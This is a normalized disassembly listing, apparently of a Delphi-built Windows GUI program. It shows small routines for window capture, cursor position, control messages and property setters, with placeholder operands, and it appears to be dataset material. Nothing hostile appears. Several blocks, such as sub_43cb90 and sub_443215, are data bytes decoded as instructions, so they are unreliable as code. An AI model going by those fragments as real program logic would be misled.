pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_43c448
xor eax eax
retn
sub_43c541
jmp sub_403e54
sub_43c548
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43c5db
jmp sub_403e54
sub_43c5e2
pop ebp
retn
sub_43c647
jmp sub_403e54
sub_43c64e
pop ebp
retn
sub_43cb90
xor al 0xea
inc ecx
add al cl
or al 0x44
add [ eax + 0x740041ea ] cl
or eax 0xe9b80044
inc ecx
add [ edx + ebp * 8 + 0x41 ] cl
add al al
0xbb40041 0x44
sub_43ccc2
inc ebx
add [ eax + 0x6d695454 ] al
add eax edx
int3
sub_43e85d

sub_43eb7c
mov dl [ eax ]
sub dl 0x1
jb r-xdata
mov [ eax ] 0x1
retn
je r-xdata
mov [ eax ] 0x0
jmp r-xdata
retn
sub_43ee6b
inc [ esi ]
add [ eax ] al
add [ ebx + 0x72 ] ah
push ebx
imul edi [ edx + 0x65 ] 0x156a0000
mov ecx rw-data
call sub_415ac0
retn
sub_43ee88
push 0x15
mov ecx rw-data
call sub_415a80
retn
sub_43ef20
call GetCapture
call sub_43ec78
test eax eax
je r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax [ rw-data ]
sub_43f184
push ebx
push eax
push sub_43f308
call sub_41f2e4
mov ebx eax
push ebx
call SetCapture
mov eax ebx
pop ebx
retn
sub_43f19c
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_43f1cc
push ebx
mov ebx edx
call ReleaseCapture
mov eax ebx
call sub_41f398
pop ebx
retn
sub_43f2aa
jmp sub_403ba0
sub_43f2dc
xor eax eax
retn
sub_43f2e0
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov ax 0xfff4
jmp r-xdata
pop ebp
retn 0x4
sub_43f2f8
retn
sub_43f2fc
mov eax [ rw-data ]
retn
sub_43f304
retn
sub_43f332
jmp sub_403ba0
sub_43f337
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_461f40
call sub_403f08
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43f354
call sub_403918
xor eax eax
mov [ rw-data ] eax
retn
sub_43f364
call sub_403914
xor eax eax
mov [ rw-data ] eax
retn
sub_43f374
retn
sub_43f378
test dl dl
je r-xdata
mov [ eax + 0x38 ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_403a24
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_43f428
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov eax [ eax + 0x38 ]
mov ax [ eax + 0x7a ]
jmp r-xdata
pop ebp
retn 0x4
sub_43f440
mov eax [ eax + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
retn
sub_43f48c
retn
sub_43f644
push esi
mov esi eax
mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffdb
call sub_4038bc
pop esi
retn
sub_43f658
push esi
mov esi eax
mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffda
call sub_4038bc
pop esi
retn
sub_43f66c
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_43f678
mov eax 0x4
retn
sub_43f680
retn
sub_440259
jmp sub_403ba0
sub_440546
jmp sub_403e54
sub_4405b8
jmp sub_403e54
sub_4405c4
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
xor eax eax
call sub_4402ec
sub_440743
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_4223e0
retn
sub_440759
jmp sub_403e54
sub_440780
jmp sub_403e54
sub_440802
jmp sub_403e54
sub_44082a
jmp sub_403e54
sub_440831
mov esp ebp
pop ebp
retn
sub_4408e9
jmp sub_403e54
sub_440940
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x58 ]
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_44090c
mov [ ebx + 0x58 ] esi
sub_440a94
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_440aa8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403870
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_440b91
jmp sub_403e54
sub_440b98
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_440c1b
jmp sub_403e54
sub_440c22
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_440ff0
xor eax eax
retn
sub_440ff4
mov al [ eax + 0x58 ]
retn
sub_440ff8
xor eax eax
retn
sub_440ffc
cmp [ eax + 0x30 ] 0x0
setne al
retn
sub_441004
mov eax [ eax + 0x30 ]
retn
sub_4410a8
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x10 ]
retn
sub_441154
push ebx
mov ebx eax
xor eax eax
mov al [ ebx + 0x5b ]
mov al [ eax + rw-data ]
cmp al [ ebx + 0x61 ]
setne al
pop ebx
retn
sub_44116c
mov [ eax + 0x5d ] dl
retn
sub_441170
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
xchg edx eax
call sub_444d58
sub_441180
push ebx
cmp [ eax + 0xfa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
sub_441663
jmp sub_403e54
sub_44166a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4416cc
test [ eax + 0x1c ] 0x1
jne r-xdata
mov [ eax + 0x158 ] edx
retn
mov [ eax + 0x150 ] 0x1
sub_441750
xor ecx ecx
mov [ edx ] ecx
xor ecx ecx
mov [ edx + 0x4 ] ecx
mov ecx [ eax + 0x48 ]
mov [ edx + 0x8 ] ecx
mov eax [ eax + 0x4c ]
mov [ edx + 0xc ] eax
retn
sub_44186d
jmp sub_403e54
sub_441874
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_441970
push eax
xor ecx ecx
mov edx 0xb037
call sub_442f30
retn
sub_441b31
add [ eax ] al
add [ esi + 0x3a ] dl
push eax
pop esp
je r-xdata
pop esi
retn
mov [ eax + 0x5c ] dl
test dl dl
je r-xdata
mov si 0xffee
call sub_4038bc
sub_441be2
jmp sub_403e54
sub_441be9
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_441cc0
cmp dl [ eax + 0x58 ]
je r-xdata
retn
mov [ eax + 0x58 ] dl
push 0x0
xor ecx ecx
mov edx 0xb00c
call sub_442f30
sub_441cd8
push 0x0
xor ecx ecx
mov edx 0xe
call sub_442f30
retn
sub_441ce8
push edx
mov edx 0xd
call sub_442f30
retn
sub_441cf4
mov edx [ eax + 0xac ]
test edx edx
jle r-xdata
mov eax [ eax + 0x4c ]
retn
mov eax edx
retn
sub_441d08
mov edx [ eax + 0xa8 ]
test edx edx
jle r-xdata
mov eax [ eax + 0x48 ]
retn
mov eax edx
retn
sub_441de9
jmp sub_403e54
sub_441df0
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_441df8
cmp dl [ eax + 0x5f ]
je r-xdata
retn
mov [ eax + 0x5f ] dl
mov [ eax + 0x60 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb03c
call sub_442f30
sub_441e68
cmp [ eax + 0x59 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x56 ] 0x0
je r-xdata
mov al 0x1
retn
sub_441e7c
mov al [ eax + 0x9a ]
xor al 0x1
retn
sub_441e88
mov al [ eax + 0x60 ]
xor al 0x1
retn
sub_441e90
cmp dl [ eax + 0x59 ]
je r-xdata
retn
mov [ eax + 0x59 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb008
call sub_442f30
sub_441eb4
cmp dl [ eax + 0x99 ]
je r-xdata
retn
mov [ eax + 0x99 ] dl
mov [ eax + 0x9a ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb022
call sub_442f30
sub_441ed8
cmp dl [ eax + 0x9a ]
je r-xdata
retn
mov [ eax + 0x9a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb023
call sub_442f30
sub_441f20
mov al [ eax + 0x5a ]
xor al 0x1
retn
sub_441f28
cmp dl [ eax + 0x5a ]
je r-xdata
retn
mov [ eax + 0x5a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb009
call sub_442f30
sub_441f4c
cmp dl [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
call sub_442f30
sub_441f70
cmp dx [ eax + 0x78 ]
je r-xdata
retn
mov [ eax + 0x78 ] dx
push 0x0
xor ecx ecx
mov edx 0xb00f
call sub_442f30
sub_441f8c
push ebx
mov ebx eax
call sub_43ef20
cmp ebx eax
sete al
pop ebx
retn
sub_441fc4
push esi
mov dl 0x1
mov si 0xffce
call sub_4038bc
pop esi
retn
sub_44210e
jmp sub_403e54
sub_442115
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_442238
test [ eax + 0x50 ] 0x40
setne cl
mov dl [ eax + 0x57 ]
call sub_4421ac
retn
sub_44228c
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x88 ]
sub_4422a0
mov edx [ eax ]
call [ edx + 0x80 ]
retn
sub_442385
jmp sub_403e54
sub_4423a4
xor eax eax
retn
sub_4423a8
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x0
jne r-xdata
mov al 0x1
retn
sub_4423c0
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x0
jne r-xdata
mov al 0x1
retn
sub_4423d8
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x1
je r-xdata
mov al 0x1
retn
sub_4423f0
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
mov al [ eax + 0x5f ]
dec eax
sub al 0x2
jb r-xdata
mov al 0x1
retn
sub_44240c
mov edx [ rw-data ]
mov ecx [ edx + 0x8 ]
mov edx [ rw-data ]
mov dl [ edx + 0x4 ]
call sub_442424
retn
sub_4424e8
retn
sub_4424ec
cmp eax [ rw-data ]
sete al
retn
sub_442560
push ebx
cmp [ eax + 0x112 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
sub_44267c
push ebp
mov ebp esp
push esi
mov si 0xffd2
call sub_4038bc
pop esi
pop ebp
retn 0x4
sub_4426bc
push ebx
cmp [ eax + 0x102 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
sub_442953
jmp sub_403e54
sub_44295a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_442964
push esi
mov esi eax
xor ecx ecx
mov eax esi
mov si 0xffe8
call sub_4038bc
pop esi
retn
sub_442978
push esi
mov esi eax
mov cl 0x1
mov eax esi
mov si 0xffe8
call sub_4038bc
pop esi
retn
sub_442c47
jmp sub_403e54
sub_442cf0
push esi
mov si 0xffee
call sub_4038bc
pop esi
retn
sub_442cfc
mov al 0x1
retn
sub_442fd4
mov ecx [ edx ]
mov [ eax + 0x40 ] ecx
mov ecx [ edx + 0x4 ]
mov [ eax + 0x44 ] ecx
mov ecx [ edx + 0x8 ]
sub ecx [ edx ]
mov [ eax + 0x48 ] ecx
mov ecx [ edx + 0xc ]
sub ecx [ edx + 0x4 ]
mov [ eax + 0x4c ] ecx
call sub_4413b8
retn
sub_442ff8
retn
sub_443215
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_419ee8
mov [ ebx + 0x5e ] al
pop esi
pop ebx
retn
sub_443230
mov al [ eax + 0x5e ]
xchg edx eax
call sub_41c194
retn
sub_443328
push ebx
cmp [ eax + 0x12a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
sub_443940
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_443948
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_443950
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_443a08
push esi
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
retn
cmp [ edx + 0x4 ] 0x0
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_443a28
push ebx
mov ebx eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x99 ]
mov eax ebx
call sub_441eb4
mov [ ebx + 0x9a ] 0x1
sub_443a80
push ebx
mov ebx eax
cmp [ ebx + 0x56 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x84 ]
mov eax ebx
call sub_441e58
mov [ ebx + 0x56 ] 0x1
sub_443aa4
mov [ edx + 0xc ] 0x1
retn
sub_443aac
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
mov edx 0xb013
call sub_442f30
sub_443ac4
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
mov edx 0xb014
call sub_442f30
sub_443adc
xor eax eax
mov [ edx + 0xc ] eax
retn
sub_443d42
jmp sub_403e54
sub_443d49
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_443d74
mov eax [ r-xdata ]
retn
sub_443f10
jmp sub_403e54
sub_443f17
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_444038
mov eax [ eax + 0xb8 ]
retn
sub_4440a0
push ebx
mov ebx eax
mov eax ebx
call sub_4423c0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax 0x20000
pop ebx
retn
sub_4440bc
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_444254
mov eax [ eax + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_444284
mov edx [ eax ]
call [ edx + 0x34 ]
retn
sub_44428c
call sub_440e24
retn
sub_44438c
jmp sub_403e54
sub_44454c
jmp sub_403e54
sub_44459c
jmp sub_403e54
sub_4445d4
retn
sub_44485d
jmp sub_403e54
sub_4449d3
jmp sub_403e54
sub_444d33
jmp sub_403e54
sub_444ddf
jmp sub_403e54
sub_444dec
inc [ eax + 0x160 ]
retn
sub_444df4
dec [ eax + 0x160 ]
cmp [ eax + 0x160 ] 0x0
jne r-xdata
retn
test [ eax + 0x54 ] 0x10
je r-xdata
call sub_444e14
sub_444e14
xor edx edx
call sub_444d58
retn
sub_444ee1
jmp sub_403e54
sub_444ee8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_444fd7
jmp sub_403e54
sub_4454fe
jmp sub_403e54
sub_445505
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_445697
jmp sub_403e54
sub_44569e
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_445774
mov ecx [ eax ]
cmp ecx [ edx ]
jne r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
cmp eax [ edx + 0x4 ]
je r-xdata
mov al 0x1
retn
sub_445961
jmp sub_403e54
sub_445968
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x180 ] edx
pop ecx
pop ebp
retn
sub_445a58
xor eax eax
retn
sub_445ac0
cmp [ eax + 0x180 ] 0x0
je r-xdata
retn
push 0x0
xor ecx ecx
mov edx 0xb033
call sub_442f30
sub_445bee
jmp sub_403ba0
sub_445d23
jmp sub_403e54
sub_445d2a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_445d34
jmp sub_403ba0
sub_445d39
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_461f40
call sub_403f08
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4462f4
jmp sub_403e54
sub_4462fb
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_446806
jmp sub_403e54
sub_446858
push ebx
mov ebx eax
call sub_420ba8
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax ebx
call sub_442f30
pop ebx
retn
sub_446874
mov ecx [ edx + 0x8 ]
push ecx
mov ecx [ edx + 0x4 ]
mov edx 0xb025
call sub_442f30
retn
sub_446888
push 0x0
xor ecx ecx
mov edx 0xb026
call sub_442f30
retn
sub_446898
push 0x0
xor ecx ecx
mov edx 0xb027
call sub_442f30
retn
sub_446b08
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_448794
pop esi
retn
sub_446c1c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_446c6c
pop esi
retn
sub_446c30
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_446d58
pop esi
retn
sub_446c44
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_446c58
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x0
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_446d4b
jmp sub_403e54
sub_446d52
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_446de2
jmp sub_403e54
sub_446de9
pop ebx
pop ecx
pop ebp
retn
sub_446df0
push esi
mov esi edx
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop esi
retn
sub_446e00
retn
sub_446e04
push ebx
cmp [ eax + 0x1c2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c4 ]
call [ ebx + 0x1c0 ]
sub_446e24
push ebx
cmp [ eax + 0x1ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1cc ]
call [ ebx + 0x1c8 ]
sub_446f84
mov edx [ eax + 0x178 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_447054
retn
sub_44716c
jmp sub_403e54
sub_447173
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44723e
jmp sub_403e54
sub_447268
xor ecx ecx
mov [ edx + 0xc ] ecx
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
retn
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov edx [ edx + 0x8 ]
mov eax [ eax + 0x17c ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
sub_4472fa
jmp sub_403e54
sub_4474b4
push ebx
cmp [ eax + 0x1e2 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1e4 ]
call [ ebx + 0x1e0 ]
sub_447758
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x180 ] eax
mov [ esi + 0x1a6 ] 0x0
pop esi
retn
sub_447834
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov dx 0xb023
mov eax esi
call sub_4452e4
pop esi
retn
sub_4478f8
push esi
mov si 0xffc1
call sub_4038bc
pop esi
retn
sub_447924
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_447938
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_44794c
call sub_4452a4
retn
sub_447954
call sub_4452a4
retn
sub_44795c
call sub_4452a4
retn
sub_447a04
push ebx
mov ebx eax
mov eax ebx
call sub_443950
mov edx [ ebx + 0x70 ]
mov eax [ ebx + 0x170 ]
call sub_421ce0
mov dx 0xb009
mov eax ebx
call sub_4452e4
pop ebx
retn
sub_447b68
call sub_4452a4
retn
sub_447b70
call sub_4452a4
retn
sub_447b78
call sub_4452a4
retn
sub_447b80
call sub_4452a4
retn
sub_447be4
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_44806e
jmp sub_403e54
sub_448075
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_448154
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xbc ]
sub_4482f8
push 0x0
xor ecx ecx
mov edx 0xb034
call sub_442f30
retn
sub_448358
push ebx
mov ebx eax
mov eax ebx
call sub_448788
test al al
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x180 ]
push eax
call UpdateWindow
sub_448374
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
pop ebx
retn
sub_44854c
push ebx
push esi
mov esi edx
mov ebx eax
push esi
mov eax ebx
call sub_448484
push eax
call GetClientRect
pop esi
pop ebx
retn
sub_4485a4
cmp edx [ eax + 0x16c ]
je r-xdata
retn
mov [ eax + 0x16c ] edx
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_442f30
sub_4485c4
cmp dl [ eax + 0x1a5 ]
je r-xdata
retn
mov [ eax + 0x1a5 ] dl
mov [ eax + 0x1a9 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb010
call sub_442f30
sub_4485e8
mov al [ eax + 0x1a9 ]
xor al 0x1
retn
sub_4485f4
cmp dl [ eax + 0x1a9 ]
je r-xdata
retn
mov [ eax + 0x1a9 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
call sub_442f30
sub_44877c
jmp sub_403e54
sub_448783
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4489a2
jmp sub_403e54
sub_4489a9
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_448ab0
call sub_442d00
retn
sub_448efe
jmp sub_403e54
sub_448f94
mov eax [ r-xdata ]
retn
sub_4490fb
jmp sub_403e54
sub_44920c
cmp dl [ eax + 0x165 ]
je r-xdata
retn
mov [ eax + 0x165 ] dl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_442f30
sub_44922c
cmp edx [ eax + 0x168 ]
je r-xdata
retn
mov [ eax + 0x168 ] edx
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_442f30
sub_449542
jmp sub_403e54
sub_4496dc
jmp sub_403e54
sub_4496e3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_4223e0
retn
sub_4496ff
jmp sub_403e54
sub_44970c
retn
sub_4497b8
mov [ edx + 0xc ] 0xffffffff
retn
sub_449816
jmp sub_403e54
sub_44981d
pop ecx
pop ecx
pop ebp
retn
sub_4498bd
jmp sub_403e54
sub_4498c4
pop ebx
mov esp ebp
pop ebp
retn
sub_449930
call sub_445a78
retn
sub_4499c3
jmp sub_403e54
sub_4499ca
pop esi
pop ecx
pop ecx
pop ebp
retn
sub_449b97
jmp sub_403e54
sub_449b9e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_449cc4
push ebx
mov ebx eax
mov eax ebx
call sub_44ecb4
or edx 0xffffffff
mov eax ebx
call sub_449df0
pop ebx
retn
sub_449d9c
jmp sub_403e54
sub_449df0
cmp dx [ eax + 0x68 ]
je r-xdata
retn
mov [ eax + 0x68 ] dx
cmp [ eax + 0x6a ] 0x0
je r-xdata
call sub_449cdc
sub_449f60
push ebx
mov ebx eax
mov eax ebx
call sub_44ed6c
test al al
je r-xdata
pop ebx
retn
push 0xffffffff
call ImageList_DragShowNolock
sub_449f78
push ebx
mov ebx eax
mov eax ebx
call sub_44ed6c
test al al
je r-xdata
pop ebx
retn
push 0x0
call ImageList_DragShowNolock
sub_44a064
push ebx
push esi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x100
mov edx esi
mov eax ebx
call sub_4466b4
and [ ebx + 0x54 ] 0xfeff
pop esi
pop ebx
retn
sub_44a0ff
jmp sub_403e54
sub_44a106
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a129
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4223e0
retn
sub_44a122
jmp sub_403e54
sub_44a129
pop ebx
pop ecx
pop ebp
retn
sub_44a130
retn
sub_44a198
xor edx edx
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
mov eax edx
retn
mov eax [ eax + 0xc ]
inc edx
test eax eax
jne r-xdata
sub_44a505
jmp sub_403e54
sub_44a6ec
mov eax [ eax + 0x8 ]
jmp r-xdata
mov edx [ eax + 0xc ]
test edx edx
jne r-xdata
mov eax edx
retn
sub_44a8d8
jmp sub_403e54
sub_44a988
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
add [ ecx + 0x4 ] 0xc
retn
add [ ecx ] 0xc
retn
sub_44a99c
inc [ eax + 0x6c ]
retn
sub_44a9a0
dec [ eax + 0x6c ]
cmp [ eax + 0x6c ] 0x0
jg r-xdata
retn
xor edx edx
mov [ eax + 0x6c ] edx
call sub_44c220
sub_44ab00
call sub_44b200
test eax eax
je r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
retn
sub_44b4ab
jmp sub_403e54
sub_44b4b2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b4cf
lea eax [ ebp - 0xc ]
call sub_40442c
retn
sub_44b4c8
jmp sub_403e54
sub_44b4cf
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44b7b0
jmp sub_403e54
sub_44b7b7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b7d4
mov eax [ ebp - 0x4 ]
call sub_4223e0
retn
sub_44b7cd
jmp sub_403e54
sub_44b7d4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b7f1
mov eax [ ebp - 0x4 ]
call sub_4036c0
retn
sub_44b7ea
jmp sub_403e54
sub_44b7f1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44bca5
jmp sub_403e54
sub_44bcac
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44be37
jmp sub_403e54
sub_44be3e
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44bef3
jmp sub_403e54
sub_44befa
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44bfe8
jmp sub_403e54
sub_44c039
jmp sub_403e54
sub_44c040
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44c0fc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44aa0c
mov [ ebx + 0x38 ] eax
pop esi
pop ebx
retn
sub_44c248
cmp [ eax + 0x6c ] 0x0
jne r-xdata
retn
mov eax edx
call sub_44a548
sub_44cb4c
jmp sub_403e54
sub_44cb53
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44cc1c
call GetCapture
retn
sub_44cc24
push ebx
mov ebx edx
push ebx
call GetCursorPos
call sub_40d38c
pop ebx
retn
sub_44cc34
push ebx
mov ebx eax
push 0x13
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
mov [ ebx + 0xc ] al
pop ebx
retn
sub_44ce9a
jmp sub_403e54
sub_44d094
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
retn
push eax
call [ rw-data ]
retn
sub_44d2a8
jmp sub_403e54
sub_44d2af
pop ebx
mov esp ebp
pop ebp
retn
sub_44d2fa
add [ eax ] al
push ebx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xdc ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe0 ]
pop ebx
retn
sub_44d377
jmp sub_403e54
sub_44d37e
pop ebp
retn
sub_44d406
jmp sub_403e54
sub_44d40d
pop ebp
retn
